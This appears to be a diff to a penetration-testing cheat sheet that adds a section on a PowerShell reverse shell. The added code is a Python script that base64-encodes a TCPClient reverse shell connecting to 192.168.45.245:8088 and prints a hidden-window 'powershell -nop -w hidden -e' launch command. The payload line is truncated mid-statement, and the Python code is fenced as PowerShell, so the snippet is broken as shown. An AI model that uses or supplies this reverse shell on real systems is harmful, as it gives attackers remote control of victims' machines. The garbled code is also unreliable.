@@ -2351,6 +2351,18 @@ cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decod
 print(cmdline)
 ```
 
+## Reverse shell using PowerShell
+```powershell
+import sys
+import base64
+
+payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.245",8088);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName >
+
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+
+print(cmd)
+```
+
 # References
 [![](https://github.com/saisathvik1.png?size=50)](https://github.com/saisathvik1)
 [![](https://github.com/swisskyrepo.png?size=50)](https://github.com/swisskyrepo)
